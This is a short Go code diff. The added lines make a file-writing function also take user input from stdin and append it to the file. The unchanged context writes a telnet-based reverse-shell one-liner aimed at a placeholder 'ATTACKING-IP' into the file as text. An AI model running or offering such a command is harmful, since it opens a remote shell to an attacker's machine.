@@ -73,6 +73,16 @@ func WriteToFile() {
 	//using normal os write
 	file.Write([]byte("\n\nfor telnet:\nrm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p\n"))
 	fmt.Println("Data succesfully written to file")
+
+	var userInput string
+	fmt.Println("Enter Data to be Written to file:\n ")
+	scanner := bufio.NewScanner(os.Stdin)
+	if scanner.Scan() {
+		userInput = scanner.Text()
+	} else {
+		log.Println(err)
+	}
+	file.WriteString(userInput)
 }
 
 func CheckFileSize() {
